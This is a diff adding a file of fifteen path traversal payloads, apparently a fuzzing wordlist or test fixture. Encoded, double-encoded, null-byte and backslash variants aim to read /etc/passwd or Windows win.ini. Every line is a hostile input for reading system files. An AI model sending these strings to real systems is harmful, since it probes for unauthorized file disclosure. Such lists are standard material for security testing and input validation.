@@ -1,0 +1,15 @@
+../../../../etc/passwd
+....//....//etc/passwd
+%2e%2e%2fetc%2fpasswd
+..%5c..%5c/etc/passwd
+%252e%252e%252fetc%252fpasswd
+/etc/passwd%00
+..\..\..\Windows\win.ini
+%2e%2e/%2e%2e/%2e%2e/etc/passwd
+....\/....\/etc/passwd
+..%255c..%255cwin.ini
+C:\Windows\win.ini
+//etc/passwd
+\.\.\/\.\.\/\.\./etc/passwd
+.../.../.../etc/passwd
+%2e%2e%2f%2e%2e%2fetc%2fpasswd
